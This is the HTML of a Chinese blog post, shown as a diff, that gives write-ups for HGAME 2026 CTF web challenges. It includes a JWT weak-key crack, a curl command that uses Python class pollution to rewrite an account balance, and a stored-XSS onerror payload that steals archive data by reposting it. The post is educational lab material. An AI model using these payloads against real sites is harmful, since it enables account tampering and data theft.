@@ -1,0 +1,754 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/assets/init/bundle.min.acf86bec8f1585feebb4a7bc424e2c509abd0c84c974075fb9eee923b2c62b39.js" integrity="sha256-rPhr7I8Vhf7rtKe8Qk4sUJq9DITJdAdfue7pI7LGKzk=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>HGAME-web2026-WP - xiaochai_123的小窝</title>
+    <link rel="icon" href="https://xiaochai-123.github.io/images/icons/icon-16x16.png?version=10de02cdc53ad46a103b64b869070266" sizes="16x16">
+    <link rel="icon" href="https://xiaochai-123.github.io/images/icons/icon-32x32.png?version=f1747f8c31b6821777c3a0956b5ba0db" sizes="32x32">
+    <link rel="icon" href="/favicon_hu_1fce3f16494f6ae3.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_f105fae78c239d0f.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_af357fe99fc0195a.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1"><link rel="icon" href="https://xiaochai-123.github.io/images/icons/favicon.ico?version=13a0b7f517ed6605fd5fc54b37b8552d">
+<meta name="keywords" content="" />
+  <meta name="description" content="HGAME2026-web复现wp_部分题解" />
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://xiaochai-123.github.io/images/HGAME2026">
+  <meta name="twitter:title" content="HGAME-web2026-WP">
+  <meta name="twitter:description" content="HGAME2026-web复现wp_部分题解">
+<meta property="og:url" content="https://xiaochai-123.github.io/posts/hgame-2026-web-wp/">
+  <meta property="og:site_name" content="xiaochai_123的小窝">
+  <meta property="og:title" content="HGAME-web2026-WP">
+  <meta property="og:description" content="HGAME2026-web复现wp_部分题解">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-05T18:35:35+08:00">
+    <meta property="article:modified_time" content="2026-03-05T18:35:35+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web">
+    <meta property="og:image" content="https://xiaochai-123.github.io/images/HGAME2026">
+
+  <meta itemprop="name" content="HGAME-web2026-WP">
+  <meta itemprop="description" content="HGAME2026-web复现wp_部分题解">
+  <meta itemprop="datePublished" content="2026-03-05T18:35:35+08:00">
+  <meta itemprop="dateModified" content="2026-03-05T18:35:35+08:00">
+  <meta itemprop="wordCount" content="65">
+  <meta itemprop="image" content="https://xiaochai-123.github.io/images/HGAME2026">
+  <meta itemprop="keywords" content="CTF,Web">
+  <meta property="og:image:alt" content="HGAME-web2026-WP" />
+  <meta name="twitter:image:alt" content="HGAME-web2026-WP" />
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.5e43b1a2119e65d96e086e7147d978bfdbb1033637f8262ecddbd3fbaee298c1.css" integrity="sha256-XkOxohGeZdluCG5xR9l4v9uxAzY3+CYuzdvT+67imME=" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
+
+
+
+<link rel="stylesheet" href="/css/custom.css">
+<script>
+(function() {
+  var originalTitle = document.title;
+  document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+      document.title = '下次再见~';
+    } else {
+      document.title = '欢迎回来~';
+      setTimeout(function() {
+        document.title = originalTitle;
+      }, 1500); 
+    }
+  });
+})();
+</script><link rel="stylesheet" href="/css/all.min.css">
+  </head>
+  <body><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-lg">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="https://xiaochai-123.github.io/">
+    <picture><img class="logo " alt="Logo" src="https://xiaochai-123.github.io/images/logo.png?v=166cbf8ee66ab6626f3f85db1fb49313" loading="lazy" width="2048" height="2048" />
+</picture>
+xiaochai_123的小窝
+</a>
+
+    <div class="offcanvas-lg offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">xiaochai_123的小窝</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-lg-0">
+        <hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/posts/">Posts
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/categories/">Categories
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/tags/">Tags
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/friends/">Friends
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-lg-none">
+    <form class="search-bar ms-auto my-auto" action="" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="Search"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-lg-none">Palette</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="Blue"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="Blue Gray"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="Brown"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="Cyan"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="Green"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="Indigo"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="Orange"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="Pink"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="Purple"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="Red"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="Teal"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="Yellow"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-lg-none">Mode</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> Light
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> Dark
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> Auto
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.6a1fd2a99f6ad87b4aa9b7ed0f10344d4273d92cc29a6fb2cf05c463ec57ce39.js" integrity="sha256-ah/SqZ9q2HtKqbftDxA0TUJz2SzCmm&#43;yzwXEY&#43;xXzjk=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">Your browser does not support JavaScript.</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><nav class="row card component" aria-label="breadcrumb">
+  <div class="card-body pb-0">
+    <ol class="hbs-breadcrumb breadcrumb flex-nowrap"><li class="breadcrumb-item text-surface"><a href="/">Home</a></li><li class="breadcrumb-item text-surface"><a href="/posts/">Posts</a></li><li class="breadcrumb-item active">HGAME-web2026-WP</li></ol>
+  </div>
+</nav><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    
+    
+    
+
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="Comments">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xl-block" role="button" title="Toggle sidebar">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">HGAME-web2026-WP</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="created on 2026-03-05 18:35:35 &#43;0800 CST.">March 5, 2026</span><span class="post-reading-time me-1 mb-1">1 min read</span><a href="/categories/ctfwp/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>CTFwp</a><a href="/tags/ctf/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">CTF</a><a href="/tags/web/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Web</a>
+</div>
+
+      <p class="lead mb-3 text-body-emphasis">HGAME2026-web复现wp_部分题解</p><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body">
+<h1 id="魔理沙的魔法目录" data-numberify>魔理沙的魔法目录<a class="anchor ms-1" href="#魔理沙的魔法目录"></a></h1>
+<p>题目描述：</p>
+<p>这是魔理沙从帕秋莉的藏书中找来的一系列魔法书</p>
+<p>她说, 如果你能阅读他们 1 个小时以上, 就会给你奖励!</p>
+<p>直接抓包</p>
+<p><picture><img class="img-fluid " alt="java_UFnyCs3Ugx" src="https://xiaochai-123.github.io/images/screenshoots/2026-03/java_UFnyCs3Ugx.png?v=ba90ba9aa2f4218f7f62de52878b915b" loading="lazy" width="2378" height="1339" />
+</picture>
+
+看到时间直接改大放包，flag就出来了</p>
+<p><picture><img class="img-fluid " alt="image-20260305181752105" src="https://xiaochai-123.github.io/images/screenshoots/2026-03/image-20260305181752105.png?v=cb38fa3485f9e0e0eafc7a2ef10a2712" loading="lazy" width="1234" height="772" />
+</picture>
+
+</p>
+<p><strong>hgame{YoU-4re_@1s0-4-m4Hou_T5Uk@I-NOwlf0b16}</strong></p>
+
+<h1 id="vidarshop" data-numberify>Vidarshop<a class="anchor ms-1" href="#vidarshop"></a></h1>
+<p>登录窗口进来是个商店，经典没钱买flag。</p>
+<p>题目描述提示管理员账户可以管钱，登录处不能写特殊符号。</p>
+<p>找半天原来是jwt</p>
+<p><picture><img class="img-fluid " alt="image-20260305183726266" src="https://xiaochai-123.github.io/images/screenshoots/2026-03/image-20260305183726266.png?v=816f82bc124a902b2c5540c7be4ed454" loading="lazy" width="1487" height="882" />
+</picture>
+
+在这藏着</p>
+<p>JWT弱密钥爆破结果为111，然而我们把role改成admin或者id改成admin没有卵用？</p>
+<p><picture><img class="img-fluid " alt="image-20260305184521018" src="https://xiaochai-123.github.io/images/screenshoots/2026-03/image-20260305184521018.png?v=bb555e6f1ab266df30f1b0a3cbbd8ba6" loading="lazy" width="1616" height="783" />
+</picture>
+
+发现是uid的问题，注册几个账户发现uid规律</p>
+<p>a,b,c,d&hellip;z对应1-26，数字直接对应，推出admin为1413914</p>
+<p>终于登录为了admin，然后还是买不了。通过改包或者抢米都改不了余额</p>
+<p>我们再看上图，<code>uid</code> 在 Header 里，使用POST /api/upadte，下面还有json大括号</p>
+<p>所以尝试python原型链污染，在抢米的时候抓包得知变量叫balance</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>xiaochai_123@binarios:~$ curl -X POST <span style="color:#e6db74">&#34;http://forward.vidar.club:30452//api/update&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzcyNzA4Nzg4fQ.BZjJ7f_603GwNzZFWxWCyY7R36PItLaB3wgqPHy3vKo&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;uid: 1413914&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;{\&#34;__init__\&#34;: {\&#34;__globals__\&#34;: {\&#34;balance\&#34;: 2000000}}}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;is_admin&#34;</span>:true,<span style="color:#e6db74">&#34;msg&#34;</span>:<span style="color:#e6db74">&#34;System Access Granted&#34;</span>,<span style="color:#e6db74">&#34;user_info&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;balance&#34;</span>:2000000,<span style="color:#e6db74">&#34;role&#34;</span>:<span style="color:#e6db74">&#34;user&#34;</span>,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">}}</span>
+</span></span><span style="display:flex;"><span>xiaochai_123@binarios:~$
+</span></span></code></pre></div><p>现在我们就有钱直接买flag啦<picture><img class="img-fluid " alt="image-20260305185510259" src="https://xiaochai-123.github.io/images/screenshoots/2026-03/image-20260305185510259.png?v=e92a0031ca6ec847987fe1dcc30fc702" loading="lazy" width="1460" height="984" />
+</picture>
+
+</p>
+
+<h1 id="博丽神社的绘马挂" data-numberify>博丽神社的绘马挂<a class="anchor ms-1" href="#博丽神社的绘马挂"></a></h1>
+<p>随便登录就登录上了？然后是发帖系统，考察XSS</p>
+<p>xss img标签外带出网，把灵梦的信息偷了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;img</span> <span style="color:#960050;background-color:#1e0010">src=x</span> <span style="color:#960050;background-color:#1e0010">onerror=</span><span style="color:#e6db74">&#34;fetch(&#39;/api/archives&#39;).then(r=&gt;r.text()).then(t=&gt;{fetch(&#39;/api/messages&#39;,{method:&#39;POST&#39;,headers:{&#39;Content-Type&#39;:&#39;application/json&#39;},body:JSON.stringify({content:&#39;ARCHIVE:&#39;+btoa(unescape(encodeURIComponent(t))),is_private:false})})})&#34;</span><span style="color:#960050;background-color:#1e0010">&gt;</span>
+</span></span></code></pre></div><p>出网弄不出来，直接让他把flag发出来看</p>
+<p><picture><img class="img-fluid " alt="msedge_slJq5rulWJ" src="https://xiaochai-123.github.io/images/screenshoots/2026-03/msedge_slJq5rulWJ.png?v=4d1e50919fdccf11090186e036774a1c" loading="lazy" width="1451" height="893" />
+</picture>
+
+<picture><img class="img-fluid " alt="java_BEku7DrBv2" src="https://xiaochai-123.github.io/images/screenshoots/2026-03/java_BEku7DrBv2.png?v=1f74b50a80e0b60a2bba03b1d92e51a1" loading="lazy" width="2371" height="709" />
+</picture>
+
+</p>
+
+<h1 id="mymonitor" data-numberify>MyMonitor<a class="anchor ms-1" href="#mymonitor"></a></h1>
+<blockquote>
+<p>NaCl闲得发昏了写了个简易WebShell并隔一段时间输入“ls”命令，你能想办法偷到flag吗？</p>
+</blockquote>
+</div>
+</div>
+</div><div class="card-footer">
+  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev">
+      <i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform="rotate-90"></i>
+      <a href="/posts/%E5%85%B3%E4%BA%8Eai%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9C%8B%E6%B3%95/">关于AI的看法</a>
+    </div><div class="post-nav post-next">
+      <a href="/posts/ctf-web-guide/">[持续更新] CTF-Web Guide</a>
+      <i class="fas fa-fw fa-chevron-down post-next-icon ms-1" data-fa-transform="rotate-270"></i>
+    </div></div>
+</div></article>
+<section class="related-posts row card component">
+      <div class="card-header">
+        <h2 class="card-title fs-4 my-2 text-surface">
+          Related Posts
+        </h2>
+      </div>
+      <div class="card-body slide px-1">
+        <div class="slide-inner row gx-0"><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="SHCTF-web2026-WP" src="https://xiaochai-123.github.io/images/shctf3rd.jpg" loading="lazy"
+     width="1771"
+     height="1018"/>
+  </picture>
+
+  <a class="post-title" href="/posts/shctf-web2026-wp/">
+    SHCTF-web2026-WP
+  </a>
+  <div class="post-meta mb-0">
+    February 22, 2026
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="XXE漏洞利用" src="https://xiaochai-123.github.io/images/xxe.png" loading="lazy"
+     width="700"
+     height="502"/>
+  </picture>
+
+  <a class="post-title" href="/posts/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+    XXE漏洞利用
+  </a>
+  <div class="post-meta mb-0">
+    February 17, 2026
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="https://xiaochai-123.github.io/images/1.png" loading="lazy"
+     width="2400"
+     height="1350"/>
+  </picture>
+
+  <a class="post-title" href="/posts/ctf-web-guide/">
+    [持续更新] CTF-Web Guide
+  </a>
+  <div class="post-meta mb-0">
+    December 22, 2025
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="SQLi-labs靶场搭建" src="https://xiaochai-123.github.io/images/SQL.png" loading="lazy"
+     width="1546"
+     height="699"/>
+  </picture>
+
+  <a class="post-title" href="/posts/sqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">
+    SQLi-labs靶场搭建
+  </a>
+  <div class="post-meta mb-0">
+    December 22, 2025
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="SQL注入——sqli-labs学习笔记" src="https://xiaochai-123.github.io/images/SQL1.png" loading="lazy"
+     width="474"
+     height="240"/>
+  </picture>
+
+  <a class="post-title" href="/posts/sqli-labs/">
+    SQL注入——sqli-labs学习笔记
+  </a>
+  <div class="post-meta mb-0">
+    December 22, 2025
+
+  </div>
+</div>
+
+          </div></div>
+        <button class="slide-control-left">
+          <i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i>
+          <span class="visually-hidden">Left</span>
+        </button>
+        <button class="slide-control-right">
+          <i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-270"></i>
+          <span class="visually-hidden">Right</span>
+        </button>
+      </div>
+    </section><div class="card component row post-comments" id="post-comments">
+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">Comments</h2>
+  </div>
+  <div class="card-body">
+
+<div class="giscus"></div>
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="card mb-3">
+  <div class="card-body text-center">
+    <img src="/images/my-avatar.jpg" alt="我的头像" class="rounded-circle mb-2" width="100" height="100">
+    <h5 class="card-title">xiaochai_123(decimo)</h5>
+	<p id="random-quote" class="card-text text-muted"></p>
+	<script>
+	const quotes = [
+  "Stay hungry, stay foolish.",
+  "欢迎大佬莅临",
+  "路漫漫其修远兮，吾将上下而求索",
+  "前途是光明的，道路是曲折的",
+  "很荣幸能和大家做朋友",
+  "生命的有限同时赋予了生活意义和遗憾"
+	];
+	document.getElementById('random-quote').innerText = quotes[Math.floor(Math.random() * quotes.length)];
+	</script>
+<nav class="d-flex justify-content-center gap-2 my-2">
+  <a class="btn btn-sm btn-outline-dark rounded-circle" href="https://github.com/xiaochai-123" title="GitHub" target="_blank">
+    <i class="fab fa-github"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-primary rounded-circle" href="mailto:l2556843965@163.com" title="Email">
+    <i class="fas fa-envelope"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-danger rounded-circle" href="https://space.bilibili.com/595746072" title="Bilibili" target="_blank">
+  <i class="fab fa-bilibili"></i> 
+</a>
+  
+</nav>
+  </div>
+</div>
+
+
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            Posts
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  Recent Posts
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="HGAME-web2026-WP" src="https://xiaochai-123.github.io/images/HGAME2026" loading="lazy"
+    
+    />
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/hgame-2026-web-wp/">
+        HGAME-web2026-WP
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          March 5, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="关于AI的看法" src="https://xiaochai-123.github.io/images/OIPC.jpg" loading="lazy"
+     width="388"
+     height="270"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/%E5%85%B3%E4%BA%8Eai%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9C%8B%E6%B3%95/">
+        关于AI的看法
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          March 1, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="胡思乱想0" src="https://xiaochai-123.github.io/images/imagine.png" loading="lazy"
+     width="500"
+     height="500"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B30/">
+        胡思乱想0
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          March 1, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="SHCTF-web2026-WP" src="https://xiaochai-123.github.io/images/shctf3rd.jpg" loading="lazy"
+     width="1771"
+     height="1018"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/shctf-web2026-wp/">
+        SHCTF-web2026-WP
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          February 22, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="Arch&#43;Hyprland" src="https://xiaochai-123.github.io/images/arch.png" loading="lazy"
+     width="833"
+     height="353"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/arch&#43;hyprland&#43;linux%E5%B0%8F%E6%8A%80%E5%B7%A7/">
+        Arch&#43;Hyprland
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          February 19, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      Actions
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="social-share mb-4 d-flex overflow-auto">
+      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="X Share Button"
+      target="_blank" href="https://x.com/intent/tweet?title=HGAME-web2026-WP&url=https%3a%2f%2fxiaochai-123.github.io%2fposts%2fhgame-2026-web-wp%2f">
